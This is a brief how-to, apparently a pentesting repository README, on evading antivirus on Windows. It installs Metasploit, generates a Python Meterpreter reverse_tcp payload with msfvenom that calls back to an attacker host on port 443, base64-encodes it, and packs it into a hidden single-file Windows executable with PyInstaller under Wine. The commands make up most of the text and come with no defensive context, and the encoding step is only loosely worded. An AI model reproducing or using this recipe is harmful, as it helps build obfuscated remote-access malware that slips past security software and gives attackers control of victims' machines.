# Antivirus Evasion for Windows

Sources: 
- https://pentestmag.com/antivirus-evasion-with-python/
- https://www.andreafortuna.org/2017/12/27/how-to-cross-compile-a-python-script-into-a-windows-executable-on-linux/
- https://www.youtube.com/watch?v=ozPaEWN4GnM
- https://stackoverflow.com/questions/63342345/cant-install-pyinstaller-at-ubuntu
- https://www.quora.com/How-do-I-make-an-executable-file-exe-which-runs-in-the-Windows-Environment-from-Python-py-file?share=1

# Install Metasploit

Metasploit: https://github.com/rapid7/metasploit-framework run the nightly script from github for installation

# Then install rest with

install.sh

# Create payload with python2 interpreter
<code>
which python2
</code>

Take care when installing packages with locally before crosscompiling to add the --user flag and look for the right pip version
<code>
python2.7 -m pip install pynput==1.0 --user
</code>


# Usage

msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.2.10 LPORT=443 -f raw -o mrtp.py
pythonpayload.py | base64 
Replace this string with the base64 string in mrtp.py
wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile -w -F mrtp.py